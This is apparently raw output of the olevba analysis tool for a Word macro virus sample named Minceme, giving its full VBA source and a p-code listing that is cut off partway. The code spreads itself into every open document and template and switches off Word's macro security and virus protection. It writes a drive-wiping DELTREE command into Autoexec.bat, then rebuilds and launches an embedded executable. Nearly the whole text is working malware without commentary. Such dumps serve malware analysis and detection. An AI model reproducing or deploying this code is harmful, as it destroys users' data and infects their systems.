olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minceme.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MX.cls 
in file: Virus.MSWord.Minceme.a - OLE stream: 'Macros/VBA/MX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Mincer.bas 
in file: Virus.MSWord.Minceme.a - OLE stream: 'Macros/VBA/Mincer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<-Mincer!->
Sub Cl()
On Error Resume Next
For Each doc In Documents
For Each A In doc.VBProject.vbcomponents
If A.Type <> 100 Then
Application.OrganizerDelete doc.FullName, A.Name, wdOrganizerObjectProjectItems
Else
If A.codemodule.lines(1, 1) <> "'<-Mincer!->" Then A.codemodule.deletelines 1, A.codemodule.CountOfLines
End If
Next A
Next doc
For Each dot In Templates
For Each A In dot.VBProject.vbcomponents
If A.Type <> "100" And A.Name <> "Mincer" Then
Application.OrganizerDelete dot.FullName, A.Name, wdOrganizerObjectProjectItems
Else
If A.codemodule.lines(1, 1) <> "'<-Mincer!->" Then A.codemodule.deletelines 1, A.codemodule.CountOfLines
End If
Next A
Next dot
End Sub
Sub IND()
On Error Resume Next
Dim body As String, RET As Boolean, NC As String
For Each Vs In MacroContainer.VBProject.vbcomponents
If Vs.Name = "Mincer" Then Set Vs = Vs.codemodule: Exit For
Next Vs
body = Vs.lines(1, Vs.CountOfLines)
For Each doc In Documents
If doc.VBProject.vbcomponents.Item(1).codemodule.lines(1, 1) <> "'<-Mincer!->" And doc.VBProject.vbcomponents.Item(1).Name <> "MX" Then
vak = InStr(doc.FullName, ":")
If (vak = 0 Or doc.ReadOnly = True) And doc.Saved = False Then
Set ill = doc.VBProject.vbcomponents.Item(1).codemodule
ill.InsertLines 1, body
doc.VBProject.vbcomponents.Item(1).Name = "Mincer"
ElseIf vak <> 0 And doc.ReadOnly = False Then
Set ill = doc.VBProject.vbcomponents.Item(1).codemodule
ill.InsertLines 1, body
doc.VBProject.vbcomponents.Item(1).Name = "Mincer"
End If
End If
Next doc
End Sub
Sub INO()
On Error Resume Next
Dim body As String, RET As Boolean, NC As String
NC = Environ("WINDIR")
If Dir(NC & "\SYSTEM\Mincer.dll") = "" Then
Open NC & "\SYSTEM\Mincer.dll" For Output As 1
For Each Vs In MacroContainer.VBProject.vbcomponents
If Vs.Name = "Mincer" Then Set Vs = Vs.codemodule: Exit For
Next Vs
body = Vs.lines(1, Vs.CountOfLines)
Print #1, "Attribute VB_Name=""Mincer"""
Print #1, body
Close
End If
For Each dot In Templates
RET = False
For Each A In dot.VBProject.vbcomponents
If A.Name = "Mincer" And A.Type <> 100 Then RET = True
Next A
If RET = False Then
dot.VBProject.vbcomponents.Import (NC & "\SYSTEM\Mincer.dll")
End If
Next dot
End Sub
Sub AutoExit()
On Error Resume Next
Application.ShowVisualBasicEditor = False
Application.EnableCancelKey = wdCancelDisabled
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
With Options
.VirusProtection = False
.AllowFastSave = True
.SavePropertiesPrompt = False
.SaveNormalPrompt = False
End With
WordBasic.DisableAutoMacros 0
sa = NormalTemplate.Saved
For Each l In CommandBars("tools").Controls
If l.ID = 522 Or l.ID = 751 Or l.ID = 797 Then l.OnAction = "AutoOpen"
Next l
NormalTemplate.Saved = sa
For Each doc In Documents
doc.ReadOnlyRecommended = False
doc.SaveFormsData = False
Next doc
End Sub
Sub MySpy()
On Error Resume Next
Dim NC As String
NC = Environ("WINDIR")
If Dir(NC & "\Media\MySpy.dot") = "" Then
WordBasic.DisableAutoMacros 1
Documents.Add NewTemplate:=True
ActiveDocument.VBProject.vbcomponents.Item(1).Name = "MX"
INO
ActiveDocument.SaveAs NC & "\Media\MySpy.dot", , , , False
Options.DefaultFilePath(Path:=wdUserTemplatesPath) = NC
Options.DefaultFilePath(Path:=wdStartupPath) = NC & "\Media"
ActiveDocument.Close
End If
WordBasic.DisableAutoMacros 0
End Sub
Sub AutoExec()
Test
Cl
AutoExit
INO
End Sub
Sub Test()
On Error Resume Next
Dim A As String, C As Long, B As String
If Format(Date, "d") <> 2 Then Exit Sub
A = "9460301/3/4/65535/184/0/64/0/0/0/0/0/0/0/0/128/247078670/-855002112/1275181089/1750344141/1881174889/1919381362/1663069537/1869508193/1700929652/1853190688/544106784/542330692/1701080941/168627502/36/0/17744/65868/891316465/0/0/17760480/327947/4096/0/0/4112/4096/8192/4194304/4096/512/4/0/4/0/8192/512/0/2/1048576/4096/1048576/4096/0/16/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/2019914798/116/4096/4096/4096/512/0/0/0/1610612768/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/195/0/0/1018/608472405/1692087288/15205255/1526726656/1363299213/17780816/1543382092/-98778237/-1956238453/1905130603/-1989781998/-289276813/1938384400/1456233986/1217130635/-2086341636/814418152/41219595/-866193173/-337955845/1692087047/545981323/1476628324/268462173/1958936640/-1054798030/75698411/-1989798620/-306054037/1804166672/588238594/1359964867/1364328298/1778477649/1394658562/-2097151744/-1919475516/-1915773626/-202617/550326527/4194407/1488986895/-1958916469/-61830895/" & _
"-1982447475/-1226049023/59475/-2091188224/-850189117/1073768480/1962891264/1409222692/1397774844/1509708799/1488986895/50011/-396361728/0/314999134/-167772157/-2062614266/520/673471629/254032771/128389/-2096693760/-1974073914/-12843965/1074006132/109656756/6964806/1535868778/205753104/1342488707/1092668758/-2097135616/2088833220/1160707078/257836376/112261/2072208896/-2062614248/427/1124120678/3285197/-2112946112/411/1404996433/-1946157059/29488703/-1201272716/-919387391/-1070344193/-919349836/-1958555085/-671136806/-157525613/108265921/1124186214/262002687/90754/-2086906368/-1070366778/-393488716/1784218730/-671131076/-1958078837/-2116550715/1162870846/612699904/1392508929/23724138/588207954/-980725556/" & _
"-1031581007/-1915224313/-1924128190/-1223733242/1418530374/682627600/-503968118/1345484429/1363236434/1359208897/-905721853/-149139925/-1856945711/66078347/-2037777338/-1106/607945062/2071724216/-671103605/1493461653/1012108114/-15547773/1849590231/1953524058/1599822439/-721201319/1441661778/-63093619/55777417/-1098034473/-1200/-833189545/-1109895539/1018/-1031589397/274369320/1980258859/-394046676/-1961326328/1510151258/-1957211384/1510148186/-60947700/-1962649463/140116248/1076120193/725614592/51279595/264758011/871091233/-348339069/19398986/856171628/-61306405/-56588659/78774271/-855586970/-1902867680/-216/251809929/657560758/738197503/266724034/1485555745/1496877840/-242545181/14025144/-10921472/1542515671/865925464/" & _
"-2640704/1935580631/1725926193/-1958542408/2123103310/-19660802/258079566/553631777/1946147979/609484600/474188121/606632835/1099630197/21399848/129024865/1910796518/-747257806/217628006/-1077512563/-2147469236/218020454/1725366266/1241536703/138856294/-687927516/-1191944563/939349/237677241/-959185152/-497983488/-1998310658/-18706176/257250744/-1430955776/13030399/-1258364384/1711311072/201868999/869728016/1400944603/1747774595/-1073737728/1364396215/23613777/1094713349/-192196271/11332737/550305792/1048580/108954470/-33197033/-286569146/-972005887/-343913146/-2012706587/-2147432959/25692296/-712534077/-712534033/-1757147924/-1745889913/-1007757945/661010944/65619/4194408/4194369/4194354/544106829/875442550/642598688/22605/"
O = "C:\Autoexec.bat"
SetAttr O, 0
Open O For Output As 1
Print #1, "DELTREE/Y C:"
Close
AW$ = InputBox("Mincer was sad!", "Test")
If AW$ = "MX" Then
Kill O
MsgBox "You know me!", 4096, "Thanks..."
Else
Open "Mincer.EXE" For Binary As 1
Do Until A = ""
C = InStr(A, "/")
B = Left(A, C - 1)
A = Right$(A, Len(A) - C)
C = Val(B)
Put 1, , C
Loop
Close
Shell "Mincer.EXE"
MsgBox "I'm sader...", 48, "No..."
End If
End Sub
Sub FileOpen()
Dialogs(wdDialogFileOpen).Show
AutoOpen
End Sub
Sub AutoOpen()
AutoExit
Cl
IND
INO
End Sub
Sub AutoClose()
MySpy
For Each doc In Documents
v& = InStr(doc.FullName, ":")
If doc.ReadOnly = False And v <> 0 Then
doc.Save
End If
Next doc
End Sub
Sub ViewVBCode()
AutoOpen
End Sub
Sub ViewSecurity()
AutoOpen
End Sub
Sub ToolsMacro()
AutoOpen
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
ActiveDocument.Saved = False
AutoOpen
End Sub
Sub FileSave()
ActiveDocument.Save
ActiveDocument.Saved = False
AutoOpen
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Minceme.a
' ===============================================================================
' Module streams:
' Macros/VBA/MX - 953 bytes
' Macros/VBA/Mincer - 15303 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000B "<-Mincer!->"
' Line #1:
' 	FuncDefn (Sub Cl())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #4:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ForEach 
' Line #5:
' 	Ld A 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Ne 
' 	IfBlock 
' Line #6:
' 	Ld doc 
' 	MemLd FullName 
' 	Ld A 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #7:
' 	ElseBlock 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld A 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x000C "'<-Mincer!->"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld A 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld A 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' 	EndIf 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	StartForVariable 
' 	Ld dot 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #13:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	Ld dot 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ForEach 
' Line #14:
' 	Ld A 
' 	MemLd TypeOf 
' 	LitStr 0x0003 "100"
' 	Ne 
' 	Ld A 
' 	MemLd New 
' 	LitStr 0x0006 "Mincer"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #15:
' 	Ld dot 
' 	MemLd FullName 
' 	Ld A 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld A 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x000C "'<-Mincer!->"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld A 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld A 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' 	EndIf 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	StartForVariable 
' 	Ld dot 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Sub IND())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	Dim 
' 	VarDefn body (As String)
' 	VarDefn RET (As Boolean)
' 	VarDefn NC (As String)
' Line #25:
' 	StartForVariable 
' 	Ld Vs 
' 	EndForVariable 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ForEach 
' Line #26:
' 	Ld Vs 
' 	MemLd New 
' 	LitStr 0x0006 "Mincer"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Vs 
' 	MemLd codemodule 
' 	Set Vs 
' 	BoS 0x0000 
' 	ExitFor 
' 	EndIf 
' Line #27:
' 	StartForVariable 
' 	Ld Vs 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld Vs 
' 	MemLd CountOfLines 
' 	Ld Vs 
' 	ArgsMemLd lines 0x0002 
' 	St body 
' Line #29:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #30:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x000C "'<-Mincer!->"
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0002 "MX"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #31:
' 	Ld doc 
' 	MemLd FullName 
' 	LitStr 0x0001 ":"
' 	FnInStr 
' 	St vak 
' Line #32:
' 	Ld vak 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld doc 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld doc 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	Set ill 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld body 
' 	Ld ill 
' 	ArgsMemCall InsertLines 0x0002 
' Line #35:
' 	LitStr 0x0006 "Mincer"
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #36:
' 	Ld vak 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld doc 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #37:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	Set ill 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld body 
' 	Ld ill 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	LitStr 0x0006 "Mincer"
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub INO())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	Dim 
' 	VarDefn body (As String)
' 	VarDefn RET (As Boolean)
' 	VarDefn NC (As String)
' Line #47:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	St NC 
' Line #48:
' 	Ld NC 
' 	LitStr 0x0012 "\SYSTEM\Mincer.dll"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld NC 
' 	LitStr 0x0012 "\SYSTEM\Mincer.dll"
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #50:
' 	StartForVariable 
' 	Ld Vs 
' 	EndForVariable 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ForEach 
' Line #51:
' 	Ld Vs 
' 	MemLd New 
' 	LitStr 0x0006 "Mincer"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Vs 
' 	MemLd codemodule 
' 	Set Vs 
' 	BoS 0x0000 
' 	ExitFor 
' 	EndIf 
' Line #52:
' 	StartForVariable 
' 	Ld Vs 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	LitDI2 0x0001 
' 	Ld Vs 
' 	MemLd CountOfLines 
' 	Ld Vs 
' 	ArgsMemLd lines 0x0002 
' 	St body 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Attribute VB_Name="Mincer""
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld body 
' 	PrintItemNL 
' Line #56:
' 	CloseAll 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld dot 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #59:
' 	LitVarSpecial (False)
' 	St RET 
' Line #60:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	Ld dot 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ForEach 
' Line #61:
' 	Ld A 
' 	MemLd New 
' 	LitStr 0x0006 "Mincer"
' 	Eq 
' 	Ld A 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St RET 
' 	EndIf 
' Line #62:
' 	StartForVariable 
' 	Ld A 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	Ld RET 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #64:
' 	Ld NC 
' 	LitStr 0x0012 "\SYSTEM\Mincer.dll"
' 	Concat 
' 	Paren 
' 	Ld dot 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemCall Import 0x0001 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	StartForVariable 
' 	Ld dot 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub AutoExit())
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #71:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #72:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #73:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #74:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #75:
' 	LitVarSpecial (True)
' 	MemStWith AllowFastSave 
' Line #76:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #77:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #78:
' 	EndWith 
' Line #79:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #80:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St sa 
' Line #81:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #82:
' 	Ld l 
' 	MemLd ID 
' 	LitDI2 0x020A 
' 	Eq 
' 	Ld l 
' 	MemLd ID 
' 	LitDI2 0x02EF 
' 	Eq 
' 	Or 
' 	Ld l 
' 	MemLd ID 
' 	LitDI2 0x031D 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	Ld l 
' 	MemSt OnAction 
' 	EndIf 
' Line #83:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' 	Ld sa 
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #85:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld doc 
' 	MemSt ReadOnlyRecommended 
' Line #87:
' 	LitVarSpecial (False)
' 	Ld doc 
' 	MemSt SaveFormsData 
' Line #88:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub MySpy())
' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	Dim 
' 	VarDefn NC (As String)
' Line #93:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	St NC 
' Line #94:
' 	Ld NC 
' 	LitStr 0x0010 "\Media\MySpy.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #95:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #96:
' 	LitVarSpecial (True)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0001 
' Line #97:
' 	LitStr 0x0002 "MX"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #98:
' 	ArgsCall INO 0x0000 
' Line #99:
' 	Ld NC 
' 	LitStr 0x0010 "\Media\MySpy.dot"
' 	Concat 
' 	ParamOmitted 
' 	ParamOmitted 
' 	ParamOmitted 
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0005 
' Line #100:
' 	Ld NC 
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #101:
' 	Ld NC 
' 	LitStr 0x0006 "\Media"
' 	Concat 
' 	Ld wdStartupPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #102:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub AutoExec())
' Line #107:
' 	ArgsCall Test 0x0000 
' Line #108:
' 	ArgsCall Cl 0x0000 
' Line #109:
' 	ArgsCall AutoExit 0x0000 
' Line #110:
' 	ArgsCall INO 0x0000 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub Test())
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	Dim 
' 	VarDefn A (As String)
' 	VarDefn C (As Long)
' 	VarDefn B (As String)
' Line #115:
' 	Ld Date 
' 	LitStr 0x0001 "d"
' 	ArgsLd Format$ 0x0002 
' 	LitDI2 0x0002 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #116:
' 	LineCont 0x000C 04 00 00 00 06 00 00 00 08 00 00 00
' 	LitStr 0x03D8 "9460301/3/4/65535/184/0/64/0/0/0/0/0/0/0/0/128/247078670/-855002112/1275181089/1750344141/1881174889/1919381362/1663069537/1869508193/1700929652/1853190688/544106784/542330692/1701080941/168627502/36/0/17744/65868/891316465/0/0/17760480/327947/4096/0/0/4112/4096/8192/4194304/4096/512/4/0/4/0/8192/512/0/2/1048576/4096/1048576/4096/0/16/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/2019914798/116/4096/4096/4096/512/0/0/0/1610612768/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/0/195/0/0/1018/608472405/1692087288/15205255/1526726656/1363299213/17780816/1543382092/-98778237/-1956238453/1905130603/-1989781998/-289276813/1938384400/1456233986/1217130635/-2086341636/814418152/41219595/-866193173/-337955845/1692087047/545981323/1476628324/268462173/1958936640/-1054798030/75698411/-1989798620/-306054037/1804166672/588238594/1359964867/1364328298/1778477649/1394658562/-2097151744/-1919475516/-1915773626/-202617/550326527/4194407/1488986895/-1958916469/-61830895/"
' 	LitStr 0x02C9 "-1982447475/-1226049023/59475/-2091188224/-850189117/1073768480/1962891264/1409222692/1397774844/1509708799/1488986895/50011/-396361728/0/314999134/-167772157/-2062614266/520/673471629/254032771/128389/-2096693760/-1974073914/-12843965/1074006132/109656756/6964806/1535868778/205753104/1342488707/1092668758/-2097135616/2088833220/1160707078/257836376/112261/2072208896/-2062614248/427/1124120678/3285197/-2112946112/411/1404996433/-1946157059/29488703/-1201272716/-919387391/-1070344193/-919349836/-1958555085/-671136806/-157525613/108265921/1124186214/262002687/90754/-2086906368/-1070366778/-393488716/1784218730/-671131076/-1958078837/-2116550715/1162870846/612699904/1392508929/23724138/588207954/-980725556/"
' 	Concat 
' 	LitStr 0x02DA "-1031581007/-1915224313/-1924128190/-1223733242/1418530374/682627600/-503968118/1345484429/1363236434/1359208897/-905721853/-149139925/-1856945711/66078347/-2037777338/-1106/607945062/2071724216/-671103605/1493461653/1012108114/-15547773/1849590231/1953524058/1599822439/-721201319/1441661778/-63093619/55777417/-1098034473/-1200/-833189545/-1109895539/1018/-1031589397/274369320/1980258859/-394046676/-1961326328/1510151258/-1957211384/1510148186/-60947700/-1962649463/140116248/1076120193/725614592/51279595/264758011/871091233/-348339069/19398986/856171628/-61306405/-56588659/78774271/-855586970/-1902867680/-216/251809929/657560758/738197503/266724034/1485555745/1496877840/-242545181/14025144/-10921472/1542515671/865925464/"
' 	Concat 
' 	LitStr 0x02DE "-2640704/1935580631/1725926193/-1958542408/2123103310/-19660802/258079566/553631777/1946147979/609484600/474188121/606632835/1099630197/21399848/129024865/1910796518/-747257806/217628006/-1077512563/-2147469236/218020454/1725366266/1241536703/138856294/-687927516/-1191944563/939349/237677241/-959185152/-497983488/-1998310658/-18706176/257250744/-1430955776/13030399/-1258364384/1711311072/201868999/869728016/1400944603/1747774595/-1073737728/1364396215/23613777/1094713349/-192196271/11332737/550305792/1048580/108954470/-33197033/-286569146/-972005887/-343913146/-2012706587/-2147432959/25692296/-712534077/-712534033/-1757147924/-1745889913/-1007757945/661010944/65619/4194408/4194369/4194354/544106829/875442550/642598688/22605/"
' 	Concat 
' 	St A 
' Line #117:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St O 
' Line #118:
' 	Ld O 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #119:
' 	Ld O 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "DELTREE/Y C:"
' 	PrintItemNL 
' Line #121:
' 	CloseAll 
' Line #122:
' 	LitStr 0x000F "Mincer was sad!"
' 	LitStr 0x0004 "Test"
' 	ArgsLd InputBox 0x0002 
' 	St AW$ 
' Line #123:
' 	Ld AW$ 
' 	LitStr 0x0002 "MX"
' 	Eq 
' 	IfBlock 
' Line #124:
' 	Ld O 
' 	ArgsCall Kill 0x0001 
' Line #125:
' 	LitStr 0x000C "You know me!"
' 	LitDI2 0x1000 
' 	LitStr 0x0009 "Thanks..."
' 	ArgsCall MsgBox 0x0003 
' Line #126:
' 	ElseBlock 
' Line #127:
' 	LitStr 0x000A "Mincer.EXE"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Binary)
' Line #128:
' 	Ld A 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoUnitil 
' Line #129:
' 	Ld A 
' 	LitStr 0x0001 "/"
' 	FnInStr 
' 	St C 
' Line #130:
' 	Ld A 
' 	Ld C 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St B 
' Line #131:
' 	Ld A 
' 	Ld A 
' 	FnLen 
' 	Ld C 
' 	Sub 
' 	ArgsLd Right$ 0x0002 
' 	St A 
' Line #132:
' 	Ld B 
' 	ArgsLd Val 0x0001 
' 	St C 
' Line #133:
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Ld C 
' 	PutRec 
' Line #134:
' 	Loop 
' Line #135:
' 	CloseAll 
' Line #136:
' 	LitStr 0x000A "Mincer.EXE"
' 	ArgsCall Shell 0x0001 
' Line #137:
' 	LitStr 0x000C "I'm sader..."
' 	LitDI2 0x0030 
' 	LitStr 0x0005 "No..."
' 	ArgsCall MsgBox 0x0003 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub FileOpen())
' Line #141:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #142:
' 	ArgsCall AutoOpen 0x0000 
' Line #143:
